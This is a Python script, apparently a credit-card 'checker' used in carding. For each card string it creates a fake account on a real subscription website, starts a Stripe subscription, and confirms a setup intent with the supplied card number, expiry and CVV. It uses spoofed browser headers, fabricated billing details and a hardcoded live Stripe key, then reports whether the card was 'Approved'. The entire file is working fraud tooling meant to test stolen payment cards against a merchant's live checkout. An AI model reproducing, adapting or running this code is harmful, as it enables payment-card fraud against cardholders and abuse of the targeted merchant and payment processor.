import requests,random
import urllib.parse
def cchk(red,id,usertele):
	cc = red.split('|')[0]
	exp=red.split('|')[1]
	try:
		exy = red.split('|')[2].split('0')[1]
	except:
		exy = red.split('|')[2]
	ccv = red.split('|')[3]
	r = requests.get("https://random-data-api.com/api/address/random_address").json()
	use="0p9o8i7u6y5t4r3e2w1q1a2s3d4f5g6h7j78k8p0pmnkolijnbhutgvcfyrdxseawq"
	email=str(''.join((random.choice(use) for i in range(8))))+'@gmail.com'
	street_name = r['street_name']	
	city = r['city']
	country = r['country']
	u='https://eg.freedomarc.org/api/users'
	h={'Host':'eg.freedomarc.org',
'content-length':'148',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
'anonymous-token':'63243972ab107167fb75anon',
'x-api-version':'0.0.1',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'content-type':'application/json',
'accept':'application/json',
'token':'sec-ch-ua-platform',
'origin':'https://eg.freedomarc.org',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://eg.freedomarc.org/subscribe-to-engaging-god',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,mt;q=0.6',}
	d='{"username":"%s","email":"%s","password":"AnA##AnA1","country":"%s","eu_customer":false,"terms":true,"custom_fields":{}}'%(street_name,email,country)
	r = requests.post(u,headers=h,data=d)
	cookie = (r.headers['set-cookie'])
	x = urllib.parse.unquote(cookie)
	token = (str(x).split(':')[1].split('"')[1])
	slim_session = r.cookies['slim_session']
	if 'true' in r.text:
		u0="https://eg.freedomarc.org/api/billing/stripe/startTransaction"
		d0='{"billing_info":null,"product_id":"engaging-god-monthly","type":"subscription","coupon":null,"plan_id":null,"user_tags":[],"address":{"country":"US","city":"Qna","line1":"Qna 52 shara aha, 5 m alfrq","postal_code":"10080"},"vatId":"","name":"mohammed salah"}'
		r0 = requests.post(u0,headers={'Host':'eg.freedomarc.org',
'content-length':'259',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
'x-api-version':'0.0.1',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'content-type':'application/json',
'accept':'application/json',
'token':token,
'sec-ch-ua-platform':'"Android"',
'origin':'https://eg.freedomarc.org',
'sec-fetch-site':'same-origin',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://eg.freedomarc.org/subscribe-to-engaging-god',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,mt;q=0.6',
'cookie':'slim_session='+slim_session,
'cookie': cookie,},data=d0)
		pid = (r0.json()['0']['id'])
		client_secret = r0.json()['intent']['client_secret']
		u1="https://api.stripe.com/v1/setup_intents/"+pid+"/confirm"
		h1={'Host':'api.stripe.com',
'content-length':'1060',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
'accept':'application/json',
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://js.stripe.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://js.stripe.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7,mt;q=0.6',}
		d1=f"payment_method_data[type]=card&payment_method_data[billing_details][name]=mohammed+salah&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][city]=Qna&payment_method_data[billing_details][address][line1]=Qna+52+shara+aha%2C+5+m+alfrq&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={ccv}&payment_method_data[card][exp_month]={exp}&payment_method_data[card][exp_year]={exy}&payment_method_data[guid]=NA&payment_method_data[muid]=d7a307c5-02e7-4378-bab6-d8f32e8f511f711f4c&payment_method_data[sid]=1c8a1010-e6f2-4c04-9da4-ee8dd49e3201595aeb&payment_method_data[payment_user_agent]=stripe.js%2Fc58a815e4%3B+stripe-js-v3%2Fc58a815e4&payment_method_data[time_on_page]=49753&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51BbSQyBm8pNft7h8Pnu21sKL0OekyfCpybF7JVAXX1rFVHRxs63Xj96MOafOUO2MIWwFXRzo4WVAIdp07ewnuawf007B3UbfJA&client_secret="+client_secret
		r1=requests.post(u1,headers=h1,data=d1)
		if '"status": "succeeded"' in  r1.text:
			return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱  ✅"
		else:
			try:
				return r1.json()['error']['code'] + '❌'
			except:
				return 'Error Card Number ❌'
	else:
			return 'Crad Error Number ❌'		